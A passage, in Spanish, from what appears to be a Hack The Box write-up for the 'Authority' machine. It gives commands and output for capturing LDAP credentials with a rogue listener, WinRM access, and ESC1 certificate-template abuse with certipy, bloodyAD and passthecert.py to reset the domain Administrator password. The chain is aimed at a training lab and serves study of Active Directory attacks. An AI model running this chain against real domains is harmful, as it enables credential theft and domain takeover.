SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.229.56   445    AUTHORITY        [-] authority.htb\svc_ldap:DevT3st@123 STATUS_LOGON_FAILURE 
SMB         10.129.229.56   445    AUTHORITY        [-] authority.htb\svc_ldap:pWm_@dm!N_!23 STATUS_LOGON_FAILURE 
SMB         10.129.229.56   445    AUTHORITY        [-] authority.htb\svc_ldap:svc_pwm STATUS_LOGON_FAILURE 
                                                                                                                                                                                           
┌──(venv)─(root㉿zsln)-[/home/…/Desktop/zsln/htb/authority]
└─# nxc ldap 10.129.229.56 -u svc_ldap -p passwords
LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
LDAP        10.129.229.56   389    AUTHORITY        [-] authority.htb\svc_ldap:DevT3st@123 
LDAP        10.129.229.56   389    AUTHORITY        [-] authority.htb\svc_ldap:pWm_@dm!N_!23 
LDAP        10.129.229.56   389    AUTHORITY        [-] authority.htb\svc_ldap:svc_pwm 
```

Pero en la web si podemos usando la pass : `pWm_@dm!N_!23`

![{9B2A1274-8E33-4188-94F6-3901298A8D13}](images/{9B2A1274-8E33-4188-94F6-3901298A8D13}.png)

Una vez dentro de la web veo que hay una seccion de conexion por el protocolo `ldap`, asi que podria intentar colocar un fake service a nombre de mi `ip` y asi poder ver si con `nc` recibimos la conexion.

![{524CE660-A783-4634-8C58-C8AE9E904D89}](images/{524CE660-A783-4634-8C58-C8AE9E904D89}.png)

```bash
nc -nlvp 389
listening on [any] 389 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.56] 61537
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!
```

Como podemos ver las conexion nos proporciono las credenciales de `svc_ldap` con la password : `lDaP_1n_th3_cle4r!`

### Validation creds

```bash
nxc smb 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
                                                                                                                                                                                           
```

Vemos que son validas para el servicio `smb` asi que veamos si con las mismas podemos conectarnos a `WinRM`.

```bash
nxc winrm 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
WINRM       10.129.229.56   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.56   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)

```

Como nos pone `pwned` nos quiere decir que si podemos conectarnos, asi que lo hacemos.


```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'     
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents>
```

## Shell as Administrator

Verificamos si tenemos acceso a otros shares con `smbmap`.

```bash
 smbmap -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -H  10.129.229.56                     

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.229.56:445       Name: authority.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       READ ONLY
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
	[*] Closed 1 connections
```

Nos conectamos por `smbclient` de impacket nuevamente.

```bash
impacket-smbclient authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.129.229.56 -dc-ip 10.129.229.56 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use department shares
ls
# ls
drw-rw-rw-          0  Tue Mar 28 14:59:41 2023 .
drw-rw-rw-          0  Tue Mar 28 14:59:41 2023 ..
drw-rw-rw-          0  Tue Mar 28 14:59:41 2023 Accounting
drw-rw-rw-          0  Tue Mar 28 14:59:26 2023 Finance
drw-rw-rw-          0  Tue Mar 28 14:59:26 2023 HR
drw-rw-rw-          0  Tue Mar 28 14:59:26 2023 IT
drw-rw-rw-          0  Tue Mar 28 14:59:26 2023 Marketing
drw-rw-rw-          0  Tue Mar 28 14:59:26 2023 Operations
drw-rw-rw-          0  Tue Mar 28 14:59:26 2023 R&D
drw-rw-rw-          0  Tue Mar 28 14:59:26 2023 Sales
```

Como la historia se repite enumeramos cada uno con `spider_plus`. Pero vemos que no hay nada dentro del mismo.

```bash
cat 10.129.229.56.json| jq                     
{
  "Department Shares": {},
  "Development": {
    "Automation/Ansible/ADC
```

```powershell
*Evil-WinRM* PS C:\users> cd ../; ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/23/2023   6:16 PM                Certs
d-----        3/28/2023   1:59 PM                Department Shares
d-----        3/17/2023   9:20 AM                Development
d-----         8/9/2022   7:00 PM                inetpub
d-----        3/24/2023   8:22 PM                PerfLogs
d-r---        3/25/2023   1:20 AM                Program Files
d-----        3/25/2023   1:19 AM                Program Files (x86)
d-----       10/28/2025   6:19 PM                pwm
d-r---        3/24/2023  11:27 PM                Users
d-----        7/12/2023   1:19 PM                Windows
-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar

```

Como vemos que no hay nada dentro de los directorios y vemos que ademas de nuestro usuario existe `Administrator`, podemos tratar de buscar plantillas vulnerables con `certipy-ad`.

```bash
 certipy-ad find -k -target-ip 10.129.229.56 -dc-host authority.htb  -vulnerable -dc-ip 10.129.229.56 -enabled -stdout -u svc_ldap -p lDaP_1n_th3_cle4r!
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[-] Error during Kerberos authentication: Empty Domain not allowed in Kerberos
[-] Got error: Empty Domain not allowed in Kerberos
[-] Use -debug to print a stacktrace
```

Como nos sale el error intentamos solicitar el `TGT` para el usuario `svc_ldap`.

```bash
 impacket-getTGT authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

```bash
dig any @10.129.229.56 authority.htb

; <<>> DiG 9.20.11-4+b1-Debian <<>> any @10.129.229.56 authority.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58203
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;authority.htb.                 IN      ANY

;; ANSWER SECTION:
authority.htb.          600     IN      A       10.129.229.56
authority.htb.          3600    IN      NS      authority.authority.htb.
authority.htb.          3600    IN      SOA     authority.authority.htb. hostmaster.htb.corp. 187 900 600 86400 3600
authority.htb.          600     IN      AAAA    dead:beef::9c66:4be6:510b:f2

;; ADDITIONAL SECTION:
authority.authority.htb. 3600   IN      A       10.129.229.56
authority.authority.htb. 3600   IN      AAAA    dead:beef::9c66:4be6:510b:f2

;; Query time: 824 msec
;; SERVER: 10.129.229.56#53(10.129.229.56) (TCP)
;; WHEN: Tue Oct 28 20:05:01 -03 2025
;; MSG SIZE  rcvd: 209


```

```bash
certipy-ad find -k -target-ip 10.129.229.56 -dc-host authority.authority.htb -vulnerable -dc-ip 10.129.229.56 -enabled -stdout -u svc_ldap -p 'lDaP_1n_th3_cle4r!'       
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 21 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'AUTHORITY-CA'
[*] Checking web enrollment for CA 'AUTHORITY-CA' @ 'authority.authority.htb'
[!] Error checking web enrollment: [Errno 111] Connection refused
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
                                                                                                              
```

Vemos que la maquina tiene una plantilla vulnerable a `ESC1` donde podemos solicitar certificado para el usuario que queramos impersonar, en este caso `Administrator`, pero como vemos en la salida del comando solo podemos inscribirnos es decir `Enroll` a una computadora del dominio `(Domain Computers)`, por lo que podriamos crear una con `bloodyAD` para luego con su credencial solicitar el certificado para el usuario `Administrator`.

```bash
bloodyAD -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -d authority.htb -k --host authority.authority.htb add computer zs1n test123
[+] zs1n created
```

Y una vez creada la computadora podemos solicitar el certificado.

```bash                                                       
certipy-ad req -dc-ip 10.129.229.56 -u 'zs1n$' -p 'test123' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn administrator@authority.htb -sid 'S-1-5-21-622327497-3269355298-2248959698-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate object SID is 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.229.56     
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@authority.htb'
[*]     SAN URL SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*]     Security Extension SID: 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Using principal: 'administrator@authority.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

Como vemos que nos da error, el mismo podemos buscarlo en google, y vemos que nos sale este [enlace](https://www.hackingarticles.in/a-detailed-guide-on-passthecert/) en el que explica que podemos hacer `Pass-The-Certificate`, con el mismo certificado `.pfx` del que disponemos, creando asi el `.crt` y el `.key`, para el usuario administrator o el usuario al que quisieramos impersonar.

Vuelvo a solicitar el `.pfx`
```bash
certipy-ad req -dc-ip 10.129.229.56 -u 'zs1n$' -p 'test123' -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn administrator@authority.htb -sid 'S-1-5-21-622327497-3269355298-2248959698-500' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate object SID is 'S-1-5-21-622327497-3269355298-2248959698-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
 
```

Y ahora con el mismo convierto uno a `.crt` y a la `.key`.

```bash                                                                                                                              certipy-ad cert -pfx administrator.pfx -nokey -out admin.crt                                                                                           
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'admin.crt'
[*] Writing certificate to 'admin.crt'

 --------------------------------                                                                                                   certipy-ad cert -pfx administrator.pfx -nocert -out admin.key
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Data written to 'admin.key'
[*] Writing private key to 'admin.key'
```

Ahora como dice en el mismo articulo podemos usar de la herramienta `passthecert.py`, la cual podemos descargar desde este [enlace](https://github.com/AlmondOffSec/PassTheCert) , para poder establecernos una shell ldap.
```bash
python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.129.229.56
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# whoami
u:HTB\Administrator
```

Ya una vez dentro de la shell como no podemos ejecutar los comandos habituales de una shell en pwoershell o cmd, vemos el panel de ayuda, y es ahi donde vemos la opcion `change_password` donde podemos cambiarle la pass al usuario `Administrator`.

```
# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

# change_password administrator zs1n123!$
Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
Attempting to set new password of: zs1n123!$
Password changed successfully!
```

 Como vemos que efectivamente nos dejo cambiarle la contraseña ahora nos conectamos via `WinRM`.

```powershell
evil-winrm -i 10.129.229.56 -u administrator -p 'zs1n123!$'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
5aac3f8e39d65e9dfd0ea6cbeb1c86bc
```

`~Happy Hacking.`